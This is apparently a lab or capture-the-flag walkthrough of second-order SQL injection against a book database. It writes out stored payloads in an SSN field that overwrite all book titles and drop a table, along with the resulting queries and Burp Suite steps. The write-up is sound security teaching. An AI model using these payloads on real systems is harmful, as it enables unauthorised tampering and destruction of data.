## Question 1 — Update the title of all books to `compromised`

The goal is:

```
books.book_name → compromised
```

### Step 1 — Open the vulnerable page

Go to:

```
http://10.49.146.133/second/add.php
```

This is the **first stage**: storing the malicious SSN.

### Step 2 — Create the payload

Use the SSN field with:

```
12345'; UPDATE books SET book_name = 'compromised'; --
```

For the other fields, you can use normal values, for example:

```
SSN:
12345'; UPDATE books SET book_name = 'compromised'; --

Book Name:
Test

Author:
Tester
```

Click **Add/Submit**.

<img width="1138" height="449" alt="Screenshot 2026-08-17 at 3 16 20 PM" src="https://github.com/user-attachments/assets/e75b6e78-452f-4143-b7b3-60acc0efa67a" />


At this point, **the UPDATE should not execute yet**. The payload is being stored first. That's the defining characteristic of second-order SQLi.

---

### Step 3 — Go to `update.php`

Open:

```
http://10.49.146.133/second/update.php
```

Find the book corresponding to the malicious SSN.

Enter something ordinary in the update fields, for example:

```
Book Name: Testing
Author: Hacker
```

Then click **Update**.

---

### Step 4 — Understand what happens

The application intends to execute something like:

```sql
UPDATE books
SET book_name = 'Testing',
    author = 'Hacker'
WHERE ssn = '12345';
```

But because the stored SSN contains the payload, it becomes conceptually:

```sql
UPDATE books
SET book_name = 'Testing',
    author = 'Hacker'
WHERE ssn = '12345';

UPDATE books
SET book_name = 'compromised';

-- remaining SQL
```

The semicolon terminates the original statement, while `--` comments out the remainder. This follows the same mechanism demonstrated in your notes.

<img width="1143" height="736" alt="Screenshot 2026-08-17 at 3 14 44 PM" src="https://github.com/user-attachments/assets/3c2a278f-6f27-40f0-be22-260ad265bc48" />


### Step 5 — Find the flag

After clicking **Update**, look at the response/page.

The lab should display a **flag value** after the condition has been successfully achieved.

So the sequence is:

```
add.php
   ↓
Store malicious SSN
   ↓
update.php
   ↓
Click Update
   ↓
All book titles become "compromised"
   ↓
FLAG appears
```

---

# Question 2 — Drop the `hello` table

This is essentially the same second-order SQLi technique, but instead of injecting an `UPDATE`, the second-stage SQL attempts to execute a `DROP TABLE`.

### Step 1 — Go back to `add.php`

Open:

```
http://10.49.146.133/second/add.php
```

### Step 2 — Put the payload in the SSN

Use:

```
12345'; DROP TABLE hello; --
```

For example:

```
SSN:
12345'; DROP TABLE hello; --

Book Name:
Test

Author:
Tester
```

Submit the form.

Again, the payload is **stored first** rather than necessarily executing at insertion time.

---

### Step 3 — Trigger the second-order injection

Go to:

```
http://10.49.146.133/second/update.php
```

Find the malicious record.

Enter normal values:

```
Book Name: Testing
Author: Hacker
```

Click **Update**.

The vulnerable query can conceptually become:

```sql
UPDATE books
SET book_name = 'Testing',
    author = 'Hacker'
WHERE ssn = '12345';

DROP TABLE hello;

-- remaining SQL
```

The important part is:

```sql
DROP TABLE hello;
```

---

### Step 4 — Retrieve the second flag

After the update executes, inspect the response from the lab.

The application should indicate that the required condition has been achieved and provide the **flag value**.

The complete flow is:

```
                FIRST REQUEST
                     │
                     ▼
              add.php
                     │
                     ▼
        Store malicious SSN
                     │
                     ▼
              Database
                     │
                     │
              SECOND REQUEST
                     ▼
              update.php
                     │
                     ▼
        Stored SSN reused in SQL
                     │
                     ▼
          Injected SQL executes
                     │
          ┌──────────┴──────────┐
          ▼                     ▼
   UPDATE books           DROP TABLE hello
          │                     │
          ▼                     ▼
       FLAG 1                 FLAG 2
```

### If you're doing this through Burp Suite

The important thing to watch is the **request/response sequence**:

1. Intercept the `add.php` request.
2. Put the payload in the `ssn` parameter.
3. Forward the request.
4. Confirm the record is stored.
5. Open/intercept the `update.php` request.
6. Trigger the update.
7. Examine the response for the flag.
